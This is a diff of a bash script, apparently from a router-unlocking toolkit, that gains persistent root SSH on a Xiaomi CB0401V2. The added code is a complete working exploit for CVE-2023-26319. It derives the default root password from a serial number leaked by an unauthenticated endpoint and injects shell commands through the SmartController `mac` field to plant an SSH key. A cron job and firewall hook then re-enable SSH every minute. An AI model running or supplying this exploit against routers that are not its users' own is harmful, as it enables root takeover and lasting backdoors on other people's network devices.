@@ -1,32 +1,34 @@
 #!/bin/bash
 #
-# open_ssh.sh — opens persistent root SSH on a factory-fresh CB0401V2,
-# without xmir-patcher or any Python dependency.
+# open_ssh.sh — opens persistent root SSH on a CB0401V2, without xmir-patcher
+# or any Python dependency.
 #
-# How this works (documented Xiaomi router behavior, not a novel exploit):
+# Two paths, tried in order:
 #
-#   1. The router's web UI exposes an UNAUTHENTICATED endpoint,
-#      api/xqsystem/init_info, which includes the device's serial number.
-#   2. Xiaomi's firmware-imaging tool (mkxqimage) derives a default
-#      root/Telnet password from that serial number:
-#         salt     = 6d2df50a-250f-4a30-a5e6-d44fb0960aa0
-#                    (the segments of a hardcoded GUID, reversed)
-#         password = md5(serial + salt), first 8 hex characters
-#   3. Stock firmware ships with Telnet (port 23) always enabled, and root
-#      accepts that derived password.
-#   4. Once logged in over Telnet, this script writes the same "soft"
-#      persistence patch used by xmir-patcher's install_ssh.py: it enables
-#      dropbear (patching /etc/init.d/dropbear's release-build gate),
-#      sets nvram ssh_en=1, and installs a cron job (+ a firewall include
-#      hook) that keeps re-applying that every minute, so it survives
-#      reboots. It then installs this toolkit's own SSH key directly,
-#      while we already have root - no separate password step needed
-#      afterward.
+#   Path A — Telnet (firmware < 3.0.100, the common case):
+#     1. api/xqsystem/init_info leaks the serial number (no auth).
+#     2. Xiaomi's mkxqimage derives the default root/Telnet password:
+#          md5(serial + "6d2df50a-250f-4a30-a5e6-d44fb0960aa0"), first 8 chars
+#     3. Log in over Telnet (port 23) with that password.
+#     4. Write ssh_patch.sh; set up a cron job + firewall include hook that
+#        re-apply it every minute (so SSH survives reboots); install our key.
 #
-# This intentionally skips xmir-patcher's OTHER install path (a custom
-# kernel module patching the immutable "bdata" NVRAM partition) - that one
-# failed in testing on this hardware ("sections missing", kernel build
-# mismatch) and was never the part that actually worked.
+#   Path B — CVE-2023-26319 web exploit (firmware 3.0.100+, Telnet closed):
+#     1. Same serial fetch + password derivation as above.
+#     2. Log in to the web UI with that password to get a session token (stok).
+#     3. Exploit the SmartController `mac` injection: the xqsmarthome
+#        request_smartcontroller endpoint passes the `mac` field unsanitised
+#        into a 100-byte sprintf() → system() call.  By injecting `;CMD;`, CMD
+#        runs as root — up to ~20 chars per call.
+#     4. Write the SSH-enable + key-install script to /tmp/e in 2-char chunks
+#        via repeated `echo -n "XX">>/tmp/e` injection calls (three HTTP
+#        requests each: scene_setting, scene_start_by_crontab, scene_delete).
+#     5. Execute the script. Then, once SSH is open, install ssh_patch.sh
+#        + cron + firewall hook over the now-available SSH connection.
+#
+#     Override WEB_PASSWORD if your web-UI password differs from the factory
+#     default (both use the same derived default on a factory-fresh router):
+#       WEB_PASSWORD=mypassword ./open_ssh.sh
 #
 # Usage: ./open_ssh.sh [router_ip] [pubkey_file]
 #
@@ -35,6 +37,7 @@ set -e
 ROUTER_IP="${1:-${ROUTER_IP:-192.168.31.1}}"
 PUBKEY_FILE="${2:-}"
 TELNET_TIMEOUT="${TELNET_TIMEOUT:-8}"
+WEB_PASSWORD="${WEB_PASSWORD:-}"
 
 say() { echo "==> $*"; }
 die() { echo "ERROR: $*" >&2; exit 1; }
@@ -53,7 +56,7 @@ HARDWARE="$(echo "$INFO_JSON" | grep -o '"hardware":"[^"]*"' | head -1 | sed 's/
 [ -n "$SERIAL" ] || die "Could not find a serial number in the router's response - this may not be a supported Xiaomi/MiWiFi device, or it isn't in factory state yet (finish the initial setup at http://$ROUTER_IP first)."
 say "Device: ${HARDWARE:-unknown} (serial: $SERIAL)"
 
-# --- 2. Derive the default root/Telnet password -----------------------------
+# --- 2. Derive the default root password ------------------------------------
 
 SALT="6d2df50a-250f-4a30-a5e6-d44fb0960aa0"
 if command -v openssl >/dev/null 2>&1; then
@@ -68,7 +71,11 @@ fi
 DEFAULT_PASSWORD="${MD5_HEX:0:8}"
 say "Derived default root password (from the serial number, not a secret we invented)."
 
-# --- 3. Log in over Telnet and patch the router -----------------------------
+# Web UI uses the same factory default as Telnet. Override with WEB_PASSWORD
+# if you've changed the web admin password but not the Telnet/SSH one.
+WEB_PASSWORD="${WEB_PASSWORD:-$DEFAULT_PASSWORD}"
+
+# --- 3. Locate and read the SSH public key ----------------------------------
 
 if [ -z "$PUBKEY_FILE" ]; then
   PUBKEY_FILE="$(dirname "${BASH_SOURCE[0]}")/../gui/router_key.pub"
@@ -76,8 +83,139 @@ fi
 [ -f "$PUBKEY_FILE" ] || die "SSH public key not found at $PUBKEY_FILE. Generate one first: ssh-keygen -t ed25519 -f router_key -N '' -C cb0401-tune-control-gui"
 PUBKEY="$(cat "$PUBKEY_FILE")"
 
+# --- Path B: CVE-2023-26319 web exploit (called when Telnet is closed) ------
+
+web_open_ssh() {
+  say "Telnet port 23 is closed; trying web exploit (CVE-2023-26319)..."
+
+  # SHA1 hash: Linux (sha1sum) or macOS (shasum).
+  if command -v sha1sum >/dev/null 2>&1; then
+    _sha1() { sha1sum | awk '{print $1}'; }
+  elif command -v shasum >/dev/null 2>&1; then
+    _sha1() { shasum -a 1 | awk '{print $1}'; }
+  else
+    die "sha1sum or shasum is required for the web login (not found)."
+  fi
+
+  # Escape \ and " for safe embedding in a JSON string value.
+  _json_escape() { printf '%s' "$1" | sed 's/\\/\\\\/g; s/"/\\"/g'; }
+
+  # --- Web login → stok -------------------------------------------------------
+
+  say "Logging in to the web UI at http://$ROUTER_IP ..."
+  _page=$(curl -s -m 10 "http://$ROUTER_IP/cgi-bin/luci/web") \
+    || die "Could not reach the router web UI."
+  _key=$(printf '%s' "$_page" | grep -o "key: '[^']*'"       | head -1 | sed "s/key: '//;s/'.*//")
+  _did=$(printf '%s' "$_page" | grep -o "deviceId = '[^']*'" | head -1 | sed "s/.*deviceId = '//;s/'.*//")
+  [ -n "$_key" ] || die "Couldn't parse the login key from the web UI. Wrong IP or unsupported firmware."
+
+  _ts=$(date +%s)
+  _rnd=$(( RANDOM % 10000 ))
+  _nonce="0_${_did}_${_ts}_${_rnd}"
+  _account=$(printf '%s%s' "$WEB_PASSWORD" "$_key" | _sha1)
+  _logdata=$(printf '%s%s' "$_nonce" "$_account"   | _sha1)
+
+  _resp=$(curl -s -m 10 -X POST \
+    "http://$ROUTER_IP/cgi-bin/luci/api/xqsystem/login" \
+    --data-urlencode "username=admin" \
+    --data-urlencode "logData=$_logdata" \
+    --data-urlencode "nonce=$_nonce")
+  _stok=$(printf '%s' "$_resp" | grep -o '"token":"[^"]*"' | head -1 | sed 's/.*"token":"//;s/".*//')
+  [ -n "$_stok" ] || die "Web login failed (wrong WEB_PASSWORD?). Response: $_resp"
+  say "Logged in."
+
+  _url="http://$ROUTER_IP/cgi-bin/luci/;stok=${_stok}/api/xqsmarthome/request_smartcontroller"
+
+  # --- Execute a short command via SmartController mac injection ---------------
+  # Three HTTP requests per call: scene_setting (creates the scene + injects
+  # our command), scene_start_by_crontab (triggers it immediately), scene_delete
+  # (cleans up). This follows xmir-patcher's connect5.py implementation exactly.
+  _tiny_exec() {
+    local _cmd="$1" _r _id _jc
+    _jc=$(_json_escape "$_cmd")
+    _r=$(curl -s -m 8 -X POST "$_url" \
+      -H 'Content-Type: application/json' \
+      -d "{\"command\":\"scene_setting\",\"action_list\":[{\"thirdParty\":\"xmrouter\",\"payload\":{\"command\":\"wan_block\",\"mac\":\";${_jc};\"}}],\"launch\":{\"timer\":{\"time\":\"23:59\",\"repeat\":\"0\",\"enabled\":true}}}")
+    _id=$(printf '%s' "$_r" | grep -o '"id":[0-9]*' | head -1 | sed 's/"id"://')
+    [ -n "$_id" ] || { printf 'WARN: injection failed for: %s\n' "$_cmd" >&2; return 1; }
+    curl -s -m 8 -X POST "$_url" -H 'Content-Type: application/json' \
+      -d "{\"command\":\"scene_start_by_crontab\",\"id\":${_id}}" >/dev/null
+    sleep 0.5
+    curl -s -m 8 -X POST "$_url" -H 'Content-Type: application/json' \
+      -d "{\"command\":\"scene_delete\",\"id\":${_id}}" >/dev/null
+  }
+
+  # Write a script to /tmp/e in 2-char chunks then execute it.
+  # Max command length per injection call is ~20 chars; `echo -n "XX">>/tmp/e`
+  # is exactly 20, so we write two characters of content per call.
+  _exec_on_router() {
+    local _s="$1" _i=0 _n _c
+    _n=${#_s}
+    _tiny_exec "rm -f /tmp/e" || true
+    say "Writing ${_n}-char script via injection ($(( (_n+1)/2 )) calls × 3 HTTP requests each)..."
+    while [ $_i -lt $_n ]; do
+      _c="${_s:$_i:2}"
+      _tiny_exec "echo -n \"${_c}\">>/tmp/e"
+      _i=$(( _i + 2 ))
+    done
+    say "Executing /tmp/e on the router..."
+    _tiny_exec "sh /tmp/e"
+    _tiny_exec "rm -f /tmp/e" || true
+  }
+
+  # Bootstrap script written through the injection.
+  # Design constraints: no double-quote chars (would break the echo injection
+  # syntax); uses unquoted `echo` for the SSH key line (SSH key chars — base64
+  # A-Za-z0-9+/= plus the ssh-ed25519 prefix and comment — are not glob-special
+  # so unquoted echo is safe and outputs them space-separated correctly).
+  _script="mkdir -p /etc/dropbear;nvram set ssh_en=1;nvram commit;sed -i s/release/XXXXXX/g /etc/init.d/dropbear;/etc/init.d/dropbear enable;/etc/init.d/dropbear restart;echo ${PUBKEY}>>/etc/dropbear/authorized_keys;chmod 600 /etc/dropbear/authorized_keys"
+
+  _exec_on_router "$_script"
+
+  say "Waiting for dropbear to start..."
+  sleep 4
+
+  # --- Install persistence via the now-open SSH connection --------------------
+  _priv="${PUBKEY_FILE%.pub}"
+  _sshopts=(-o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa \
+            -o StrictHostKeyChecking=no -o ConnectTimeout=8)
+
+  if ! ssh "${_sshopts[@]}" -i "$_priv" "root@$ROUTER_IP" true 2>/dev/null; then
+    die "SSH did not open after the exploit. CVE-2023-26319 may be patched on this firmware (try xmir-patcher instead)."
+  fi
+
+  say "SSH is up. Installing persistence (ssh_patch.sh + cron + firewall hook) via SSH..."
+  ssh "${_sshopts[@]}" -i "$_priv" "root@$ROUTER_IP" sh <<'REMOTE_PERSISTENCE'
+mkdir -p /etc/crontabs/patches
+cat > /etc/crontabs/patches/ssh_patch.sh <<'SSH_PATCH_EOF'
+#!/bin/sh
+nvram set ssh_en=1
+nvram commit
+sed -i s/release/XXXXXX/g /etc/init.d/dropbear
+/etc/init.d/dropbear enable
+/etc/init.d/dropbear restart
+SSH_PATCH_EOF
+chmod +x /etc/crontabs/patches/ssh_patch.sh
+grep -v "/ssh_patch.sh" /etc/crontabs/root > /etc/crontabs/root.new 2>/dev/null || echo "" > /etc/crontabs/root.new
+echo "*/1 * * * * /etc/crontabs/patches/ssh_patch.sh >/dev/null 2>&1" >> /etc/crontabs/root.new
+mv /etc/crontabs/root.new /etc/crontabs/root
+uci set firewall.auto_ssh_patch=include
+uci set firewall.auto_ssh_patch.type='script'
+uci set firewall.auto_ssh_patch.path='/etc/crontabs/patches/ssh_patch.sh'
+uci set firewall.auto_ssh_patch.enabled='1'
+uci commit firewall
+REMOTE_PERSISTENCE
+}
+
+# --- Path A: Telnet (try first) ---------------------------------------------
+
 say "Connecting to Telnet on $ROUTER_IP:23 ..."
-exec 3<>"/dev/tcp/$ROUTER_IP/23" || die "Could not open a TCP connection to $ROUTER_IP:23 (Telnet). It may already be disabled - if SSH already works, you don't need this script."
+if ! exec 3<>"/dev/tcp/$ROUTER_IP/23" 2>/dev/null; then
+  web_open_ssh
+  say "Done. SSH is open and this toolkit's key is installed."
+  say "Verify with: ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa -i ${PUBKEY_FILE%.pub} root@$ROUTER_IP"
+  exit 0
+fi
 
 # Reads from fd 3 one byte at a time (no external tools needed) until
 # $1 is seen in the accumulated buffer, or $TELNET_TIMEOUT seconds pass.
@@ -164,4 +302,4 @@ tn_send 'exit'
 exec 3<&- 3>&- 2>/dev/null || true
 
 say "Done. SSH should now be enabled and this toolkit's key installed."
-say "Verify with: ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa -i <key> root@$ROUTER_IP"
+say "Verify with: ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa -i ${PUBKEY_FILE%.pub} root@$ROUTER_IP"
